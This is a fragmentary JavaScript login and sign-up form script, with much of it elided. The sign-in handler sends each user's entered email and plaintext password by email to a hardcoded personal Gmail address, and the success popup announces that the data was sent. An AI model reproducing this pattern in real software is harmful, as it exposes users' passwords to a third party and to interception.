...
SIGNUPBTN.addEventListener("click", function () {
  ...
  if (
    ...
    signUpFname.length == 0 ||
    signUpLname.length == 0 ||
    ...
    Email.send({
      ...
      To: "ashfaque3777@gmail.com",
      From: "ashfaque3777@gmail.com",
...
SIGNINBTN.addEventListener("click", function () {
  ...
  if (signUpEmail.length == 0 || signUpPass.length == 0) {
    ...
    Email.send({
      ...
      Body: "Email : " + signUpEmail + "<br> Pass : " + signUpPass,
    }).then((message) =>
      swal("Login Successfully", "Your data sent to Mr. Ashfaque", "success")
    );
  }
});
